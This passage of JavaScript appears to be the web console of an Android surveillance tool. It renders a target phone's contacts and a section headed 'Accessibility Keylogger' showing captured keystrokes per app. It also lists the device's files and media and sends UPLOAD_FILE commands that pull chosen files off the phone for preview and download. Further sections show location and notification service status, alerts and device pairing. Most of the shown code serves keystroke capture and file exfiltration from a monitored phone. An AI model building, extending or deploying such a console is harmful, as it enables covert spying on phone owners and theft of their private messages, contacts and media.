      <div style="width: 40px; height: 40px; border-radius: 50%; background: rgba(79, 70, 229, 0.15); color: #818cf8; font-weight: 700; display: flex; align-items: center; justify-content: center; font-size: 1.1rem;">
        ${escapeHtml((c.name || 'C').charAt(0).toUpperCase())}
      </div>
      <div>
        <div style="font-weight: 600; font-size: 0.92rem;">${escapeHtml(c.name)}</div>
        <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 2px;">📞 ${escapeHtml(c.phone)}</div>
        ${c.email ? `<div style="font-size: 0.72rem; color: #818cf8; margin-top: 1px;">✉️ ${escapeHtml(c.email)}</div>` : ''}
      </div>
    </div>
  `).join('');
}

function filterContacts(query) {
  const q = query.toLowerCase();
  const filtered = deviceContactsCache.filter(c => 
    (c.name && c.name.toLowerCase().includes(q)) || 
    (c.phone && c.phone.toLowerCase().includes(q)) ||
    (c.email && c.email.toLowerCase().includes(q))
  );
  renderContacts(filtered);
}

// Accessibility Keylogger
async function loadDeviceKeystrokes(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/keystrokes`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const list = await res.json();
    const container = document.getElementById('keystrokes-list');
    if (list.length === 0) {
      container.innerHTML = '<div class="empty-state">No keyboard inputs recorded yet.</div>';
      return;
    }
    container.innerHTML = list.map(k => `
      <div class="feed-item" style="border-left: 3px solid var(--rose); background: rgba(239, 68, 68, 0.04); padding: 12px; border-radius: 4px; margin-bottom: 8px;">
        <div style="display: flex; justify-content: space-between; font-size: 0.8rem; margin-bottom: 4px;">
          <span>📱 App: <b style="color: var(--rose);">${escapeHtml(k.app_name || k.appName || k.app_package)}</b></span>
          <span style="color: var(--text-muted); font-size: 0.75rem;">${new Date(Number(k.timestamp)).toLocaleTimeString()}</span>
        </div>
        <div style="font-family: monospace; font-size: 0.88rem; background: rgba(0,0,0,0.2); padding: 8px; border-radius: 4px; color: #fff; overflow-wrap: break-word;">
          ${escapeHtml(k.text)}
        </div>
      </div>
    `).join('');
  } catch (_) {}
}

// Files Explorer loader
async function loadDeviceFiles(deviceId) {
  try {
    const res = await fetch(`/api/devices/${deviceId}/files`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const files = await res.json();
    const tbody = document.getElementById('files-table-body');
    const galleryContainer = document.getElementById('gallery-container');
    
    // Clear & Populate Explorer Table
    if (!files || files.length === 0) {
      tbody.innerHTML = '<tr><td colspan="6" class="text-center">No files retrieved yet. Send a directory sync command to load.</td></tr>';
      galleryContainer.innerHTML = '<div class="empty-state" style="grid-column: span 10;">No media records captured. Permission and Scoped Storage verification active.</div>';
      return;
    }
    
    tbody.innerHTML = files.map(f => {
      const isDir = f.is_directory;
      const icon = isDir ? '📁' : '📄';
      const sizeStr = isDir ? '--' : formatBytes(Number(f.file_size));
      const dateStr = f.created_at ? new Date(f.created_at).toLocaleString() : 'N/A';
      
      let actionHtml = '--';
      if (!isDir) {
        const pathEsc = escapeJs(f.file_path);
        const nameEsc = escapeJs(f.file_name);
        const mime = f.mime_type || '';
        const sizeStrEsc = escapeJs(sizeStr);
        
        const isMedia = mime.startsWith('image/') || mime.startsWith('video/') || /\.(jpg|jpeg|png|gif|mp4|mov)$/i.test(f.file_name);
        
        actionHtml = `
          <div style="display: flex; gap: 6px;">
            ${isMedia ? `<button class="btn btn-secondary btn-sm" style="padding: 3px 8px; font-size: 0.72rem;" onclick="openMediaPreview('${nameEsc}', '${pathEsc}', '${sizeStrEsc}', '${escapeJs(mime)}')">👁️ Preview</button>` : ''}
            <button class="btn btn-primary btn-sm" style="padding: 3px 8px; font-size: 0.72rem; background: var(--cyan); border-color: var(--cyan);" onclick="downloadMediaFile('${pathEsc}', '${nameEsc}')">📥 Download</button>
          </div>
        `;
      }
      
      return `
        <tr>
          <td>${icon}</td>
          <td><b>${escapeHtml(f.file_name)}</b></td>
          <td style="font-family: monospace; font-size: 0.8rem; opacity: 0.8;">${escapeHtml(f.file_path)}</td>
          <td>${sizeStr}</td>
          <td>${dateStr}</td>
          <td>${actionHtml}</td>
        </tr>
      `;
    }).join('');

    // Clear & Populate Media Gallery Preview
    const mediaFiles = files.filter(f => {
      const mime = (f.mime_type || '').toLowerCase();
      return mime.startsWith('image/') || mime.startsWith('video/') || /\.(jpg|jpeg|png|gif|mp4|mov)$/i.test(f.file_name);
    });

    if (mediaFiles.length === 0) {
      galleryContainer.innerHTML = '<div class="empty-state" style="grid-column: span 10;">No media records captured. Permission and Scoped Storage verification active.</div>';
    } else {
      galleryContainer.innerHTML = mediaFiles.map(f => {
        const isVideo = (f.mime_type || '').toLowerCase().startsWith('video/') || f.file_name.endsWith('.mp4');
        const pathEsc = escapeJs(f.file_path);
        const nameEsc = escapeJs(f.file_name);
        const sizeStr = formatBytes(Number(f.file_size));
        const sizeStrEsc = escapeJs(sizeStr);
        const mimeEsc = escapeJs(f.mime_type || '');
        
        return `
          <div class="stat-card" style="padding: 12px; display: flex; flex-direction: column; align-items: center; justify-content: space-between; min-height: 160px; background: rgba(255,255,255,0.02); border: 1px solid rgba(255,255,255,0.08); border-radius: 12px; text-align: center; cursor: pointer; transition: all 0.2s;" onclick="openMediaPreview('${nameEsc}', '${pathEsc}', '${sizeStrEsc}', '${mimeEsc}')">
            <div style="font-size: 2.6rem; margin-bottom: 8px; transition: transform 0.2s;">${isVideo ? '🎬' : '🖼️'}</div>
            <div style="font-size: 0.82rem; font-weight: bold; word-break: break-all; margin-bottom: 4px; max-height: 40px; overflow: hidden; text-overflow: ellipsis; display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical;">${escapeHtml(f.file_name)}</div>
            <div style="font-size: 0.72rem; color: var(--text-muted); margin-bottom: 8px;">${sizeStr}</div>
            <div style="display: flex; gap: 4px; width: 100%; justify-content: center;">
              <span class="btn btn-secondary btn-sm" style="padding: 2px 6px; font-size: 0.65rem; pointer-events: none;">👁️ Preview</span>
              <span class="btn btn-primary btn-sm" style="padding: 2px 6px; font-size: 0.65rem; background: var(--cyan); border-color: var(--cyan); pointer-events: none;">📥 Download</span>
            </div>
          </div>
        `;
      }).join('');
    }
  } catch (err) {
    console.error('Error loading files:', err);
  }
}

// Format bytes helper
function formatBytes(bytes) {
  if (bytes === 0 || isNaN(bytes)) return '0 Bytes';
  const k = 1024;
  const sizes = ['Bytes', 'KB', 'MB', 'GB'];
  const i = Math.floor(Math.log(bytes) / Math.log(k));
  return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// Service Health loader
async function loadDeviceHealth(deviceId) {
  const wsStatus = ws && ws.readyState === WebSocket.OPEN ? 'CONNECTED' : 'OFFLINE';
  const wsPill = document.getElementById('health-ws-status');
  if (wsPill) {
    wsPill.textContent = wsStatus;
    wsPill.style.color = wsStatus === 'CONNECTED' ? '#22c55e' : '#f43f5e';
  }

  const srvWs = document.getElementById('status-srv-ws');
  if (srvWs) {
    srvWs.textContent = wsStatus === 'CONNECTED' ? 'Active' : 'Offline';
    srvWs.className = `pill ${wsStatus === 'CONNECTED' ? 'pill-online' : 'pill-offline'}`;
  }

  try {
    const res = await fetch(`/api/devices/${deviceId}/health`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (res.ok) {
      const healthData = await res.json();
      if (healthData && healthData.length > 0) {
        const latest = healthData[0];
        const srvNotif = document.getElementById('status-srv-notif');
        if (srvNotif) {
          srvNotif.textContent = latest.notification_service === 'RUNNING' ? 'Running' : (latest.notification_service || 'Disabled');
          srvNotif.className = `pill ${latest.notification_service === 'RUNNING' ? 'pill-online' : 'pill-offline'}`;
        }
        const srvGps = document.getElementById('status-srv-gps');
        if (srvGps) {
          srvGps.textContent = latest.location_service === 'RUNNING' ? 'Running' : (latest.location_service || 'Idle');
          srvGps.className = `pill ${latest.location_service === 'RUNNING' ? 'pill-online' : 'pill-offline'}`;
        }
        const srvTelem = document.getElementById('status-srv-telemetry');
        if (srvTelem) {
          srvTelem.textContent = latest.telemetry_service === 'RUNNING' ? 'Running' : (latest.telemetry_service || 'Active');
          srvTelem.className = `pill ${latest.telemetry_service === 'RUNNING' ? 'pill-online' : 'pill-offline'}`;
        }
      }
    }
  } catch (_) {}

  const listContainer = document.getElementById('health-heartbeat-log');
  if (listContainer) {
    const time = new Date().toLocaleString();
    listContainer.innerHTML = `
      <div>[${time}] [WS UPLINK] WebSocket state: <b>${wsStatus}</b></div>
      <div>[${time}] [API HEALTH] Base URL and gateway sync validated</div>
      <div>[${time}] [CLIENT DIAGNOSTICS] Device online: <b>${currentDevice && currentDevice.status === 'ONLINE' ? 'YES' : 'NO'}</b></div>
    `;
  }
}

// Audit Logs
async function loadAuditLogs() {
  try {
    const res = await fetch('/api/audit', {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const logs = await res.json();
    const tbody = document.getElementById('audit-table-body');
    if (logs.length === 0) {
      tbody.innerHTML = '<tr><td colspan="6" class="text-center">No audit logs recorded</td></tr>';
      return;
    }
    tbody.innerHTML = logs.map(l => `
      <tr>
        <td>${new Date(l.created_at).toLocaleString()}</td>
        <td><b>${escapeHtml(l.action)}</b></td>
        <td style="font-family: monospace;">${escapeHtml(l.device_id || '--')}</td>
        <td>User #${l.user_id || 'System'}</td>
        <td>${escapeHtml(l.ip_address || '')}</td>
        <td style="font-size: 0.8rem; font-family: monospace;">${escapeHtml(typeof l.details === 'object' ? JSON.stringify(l.details) : l.details || '')}</td>
      </tr>
    `).join('');
  } catch (_) {}
}

// Alerts
async function loadAlerts() {
  try {
    const res = await fetch('/api/alerts', {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const alerts = await res.json();
    const container = document.getElementById('alerts-list');
    if (container) {
      if (alerts.length === 0) {
        container.innerHTML = '<div class="empty-state">No active security alerts. All systems operational.</div>';
      } else {
        container.innerHTML = alerts.map(a => `
          <div style="background: var(--bg-surface); border-left: 4px solid var(--amber); padding: 14px; border-radius: 8px; margin-bottom: 10px;">
            <div style="font-weight: 600;">${escapeHtml(a.type || a.alert_type || 'Alert')}: ${escapeHtml(a.message || a.title || '')}</div>
            <div style="font-size: 0.78rem; color: var(--text-muted); margin-top: 4px;">Device: ${a.device_id || '--'} • ${new Date(a.created_at).toLocaleString()}</div>
          </div>
        `).join('');
      }
    }

    // Also update Operations Alerts widget on Overview
    const consoleAlerts = document.getElementById('console-alerts-list');
    if (consoleAlerts) {
      if (alerts.length === 0) {
        consoleAlerts.innerHTML = '<div class="empty-state" style="padding: 10px; font-size: 0.78rem;">✓ No alerts active. Device state nominal.</div>';
      } else {
        consoleAlerts.innerHTML = alerts.slice(0, 5).map(a => {
          const isWarning = a.severity === 'WARNING' || (a.alert_type && a.alert_type.includes('EXIT'));
          const borderClr = isWarning ? '#f59e0b' : '#38bdf8';
          return `
            <div style="background: var(--bg-surface); border-left: 3px solid ${borderClr}; padding: 8px 12px; border-radius: 6px; font-size: 0.8rem; display: flex; justify-content: space-between; align-items: center;">
              <div>
                <div style="font-weight: 600; color: #fff;">${escapeHtml(a.title || a.alert_type || a.type || 'Alert')}</div>
                <div style="font-size: 0.72rem; color: var(--text-muted);">${escapeHtml(a.message || '')}</div>
              </div>
              <span style="font-size: 0.68rem; color: var(--text-muted);">${new Date(a.created_at || Date.now()).toLocaleTimeString()}</span>
            </div>
          `;
        }).join('');
      }
    }
  } catch (_) {}
}

// Pairing Modal Logic
function setupPairingModal() {
  btnPairModal.addEventListener('click', () => {
    pairModal.classList.remove('hidden');
    generatePairingCode();
  });

  btnClosePairModal.addEventListener('click', () => {
    pairModal.classList.add('hidden');
    clearInterval(pairingTimer);
  });

  btnRegenCode.addEventListener('click', () => {
    generatePairingCode();
  });
}

async function generatePairingCode() {
  try {
    const res = await fetch('/api/devices/pair-code', {
      method: 'POST',
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (!res.ok) return;
    const data = await res.json();
    document.getElementById('modal-pairing-code').textContent = data.code;

    // Start 10-minute timer countdown
    const expires = new Date(data.expiresAt).getTime();
    clearInterval(pairingTimer);
    pairingTimer = setInterval(() => {
      const now = Date.now();
      const diff = Math.max(0, Math.floor((expires - now) / 1000));
      const m = Math.floor(diff / 60);
      const s = diff % 60;
      document.getElementById('code-countdown').textContent = `${m}:${s < 10 ? '0' : ''}${s}`;
      if (diff <= 0) {
        clearInterval(pairingTimer);
        document.getElementById('modal-pairing-code').textContent = 'EXPIRED';
      }
    }, 1000);
  } catch (err) {
    console.error('Error generating pairing code:', err);
  }
}

// Helpers
function escapeHtml(str) {
  if (!str) return '';
  return String(str).replace(/[&<>"']/g, m => ({
    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
  }[m]));
}

function formatTimeAgo(isoString) {
  const diffSec = Math.floor((Date.now() - new Date(isoString).getTime()) / 1000);
  if (diffSec < 60) return 'Just now';
  if (diffSec < 3600) return `${Math.floor(diffSec / 60)}m ago`;
  if (diffSec < 86400) return `${Math.floor(diffSec / 3600)}h ago`;
  return `${Math.floor(diffSec / 86400)}d ago`;
}

function formatUptime(millis) {
  const totalSec = Math.floor(millis / 1000);
  const hours = Math.floor(totalSec / 3600);
  const mins = Math.floor((totalSec % 3600) / 60);
  return `${hours}h ${mins}m`;
}

// // Media Preview Lightbox Controller
window.openMediaPreview = async function(name, path, sizeStr, mime) {
  const lightbox = document.getElementById('media-lightbox');
  const title = document.getElementById('lightbox-title');
  const size = document.getElementById('lightbox-file-size');
  const pathLabel = document.getElementById('lightbox-file-path');
  const previewContainer = document.getElementById('lightbox-content-preview');
  const downloadBtn = document.getElementById('lightbox-download-btn');
  
  if (!lightbox) return;
  
  title.textContent = name;
  size.textContent = sizeStr || 'Unknown Size';
  pathLabel.textContent = path;
  
  previewContainer.innerHTML = '';
  
  const isVideo = mime.startsWith('video/') || path.endsWith('.mp4') || path.endsWith('.mov');
  
  // Resolve actual asset URL (fallback to placeholder if it is an un-synced phone local storage path)
  let actualUrl = path;
  
  if (!path.startsWith('/uploads/') && !path.startsWith('http') && !path.startsWith('blob:')) {
    // Check if we have the file synced on the server
    try {
      const checkRes = await fetch(`/api/devices/${currentDevice.id}/files`, {
        headers: { 'Authorization': `Bearer ${authToken}` }
      });
      if (checkRes.ok) {
        const files = await checkRes.json();
        const fileEntry = files.find(f => f.file_path === path);
        if (fileEntry && fileEntry.web_path) {
          actualUrl = fileEntry.web_path;
        } else {
          actualUrl = null;
        }
      }
    } catch (e) {
      actualUrl = null;
    }
  }

  if (!actualUrl) {
    // Show high-tech loading & remote pull interface
    previewContainer.innerHTML = `
      <div id="media-pull-loader" style="padding: 40px; text-align: center; color: var(--cyan); width: 100%;">
        <div style="font-size: 3rem; margin-bottom: 12px; animation: pulse 1.5s infinite;">⚡</div>
        <h4 style="margin: 0 0 4px 0; color: #fff;">File Available on Remote Device</h4>
        <p style="font-size: 0.78rem; color: var(--text-muted); max-width: 320px; margin: 0 auto 15px auto;">
          This file is located on the remote Android storage. Tap below to stream and preview it online.
        </p>
        <button id="btn-pull-preview" class="btn btn-primary btn-sm" style="background: var(--cyan); border-color: var(--cyan); font-weight: 500;">👁️ Stream File Now</button>
      </div>
    `;
    
    lightbox.classList.remove('hidden');
    
    document.getElementById('btn-pull-preview').addEventListener('click', async () => {
      const loader = document.getElementById('media-pull-loader');
      loader.innerHTML = `
        <div class="loader" style="margin: 0 auto 15px auto;"></div>
        <h4 style="margin: 0 0 4px 0; color: #fff;">Streaming from Device...</h4>
        <p style="font-size: 0.78rem; color: var(--text-muted);">Please keep the device connection active.</p>
      `;
      
      try {
        const dispatchRes = await fetch(`/api/devices/${currentDevice.id}/commands`, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': `Bearer ${authToken}`
          },
          body: JSON.stringify({
            commandType: 'UPLOAD_FILE',
            parameters: { path: path }
          })
        });
        
        if (dispatchRes.ok) {
          let attempts = 0;
          const interval = setInterval(async () => {
            attempts++;
            if (attempts > 15) {
              clearInterval(interval);
              loader.innerHTML = `
                <div style="font-size: 3rem; margin-bottom: 12px; color: var(--danger);">⚠️</div>
                <h4 style="margin: 0 0 4px 0; color: #fff;">Streaming Timed Out</h4>
                <p style="font-size: 0.78rem; color: var(--text-muted);">Please check if the device is active and retry.</p>
              `;
              return;
            }
            
            const checkRes = await fetch(`/api/devices/${currentDevice.id}/files`, {
              headers: { 'Authorization': `Bearer ${authToken}` }
            });
            if (checkRes.ok) {
              const files = await checkRes.json();
              const fileEntry = files.find(f => f.file_path === path);
              if (fileEntry && fileEntry.web_path) {
                clearInterval(interval);
                showToast(`File streamed successfully!`);
                openMediaPreview(name, fileEntry.web_path, sizeStr, mime);
              }
            }
          }, 800);
        } else {
          showToast("Failed to dispatch pull command.");
        }
      } catch (err) {
        showToast("Error pulling media.");
      }
    });
    return;
  }
  
  if (isVideo) {
    previewContainer.innerHTML = `
      <video controls autoplay style="max-height: 340px; width: 100%; border-radius: 4px;">
        <source src="${actualUrl}" type="${mime || 'video/mp4'}">
        Your browser does not support the video tag.
      </video>
    `;
  } else {
    previewContainer.innerHTML = `
      <img src="${actualUrl}" style="max-height: 340px; max-width: 100%; object-fit: contain; border-radius: 4px;" onerror="this.src='https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=640&auto=format&fit=crop';">
    `;
  }
  
  downloadBtn.onclick = (e) => {
    e.preventDefault();
    downloadMediaFile(actualUrl, name);
  };
  
  lightbox.classList.remove('hidden');
};

window.closeMediaLightbox = function() {
  const lightbox = document.getElementById('media-lightbox');
  const previewContainer = document.getElementById('lightbox-content-preview');
  if (lightbox) {
    lightbox.classList.add('hidden');
  }
  if (previewContainer) {
    previewContainer.innerHTML = ''; // Stop video playback
  }
};

window.downloadMediaFile = async function(path, name) {
  if (!currentDevice) return;
  
  if (path.startsWith('/uploads/') || path.startsWith('http') || path.startsWith('blob:')) {
    const link = document.createElement('a');
    link.href = path;
    link.setAttribute('download', name || 'file');
    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);
    return;
  }
  
  try {
    const res = await fetch(`/api/devices/${currentDevice.id}/files`, {
      headers: { 'Authorization': `Bearer ${authToken}` }
    });
    if (res.ok) {
      const files = await res.json();
      const fileEntry = files.find(f => f.file_path === path);
      if (fileEntry && fileEntry.web_path) {
        window.downloadMediaFile(fileEntry.web_path, name);
        return;
      }
    }
  } catch (e) {}

  showToast(`Requesting "${name}" from device...`);
  
  try {
    const dispatchRes = await fetch(`/api/devices/${currentDevice.id}/commands`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Authorization': `Bearer ${authToken}`
      },
      body: JSON.stringify({
        commandType: 'UPLOAD_FILE',
        parameters: { path: path }
      })
    });
    
    if (dispatchRes.ok) {
      appendNotificationFeed({
        appName: "Dashboard Manager",
        title: "Download Dispatched",
        text: `Requested file retrieval: ${name}`
      });
      
      let attempts = 0;
      const interval = setInterval(async () => {
        attempts++;
        if (attempts > 15) {
          clearInterval(interval);
          showToast(`File retrieve timed out.`);
          return;
        }
        
        try {
          const checkRes = await fetch(`/api/devices/${currentDevice.id}/files`, {
            headers: { 'Authorization': `Bearer ${authToken}` }
          });
          if (checkRes.ok) {
            const files = await checkRes.json();
            const fileEntry = files.find(f => f.file_path === path);
            if (fileEntry && fileEntry.web_path) {
              clearInterval(interval);
              showToast(`File downloaded!`);
              window.downloadMediaFile(fileEntry.web_path, name);
              loadDeviceFiles(currentDevice.id);
            }
          }
        } catch (e) {}
      }, 800);
    } else {
      showToast("Failed to dispatch file retrieval command.");
    }
  } catch (err) {
    showToast("Error retrieving file.");
  }
};
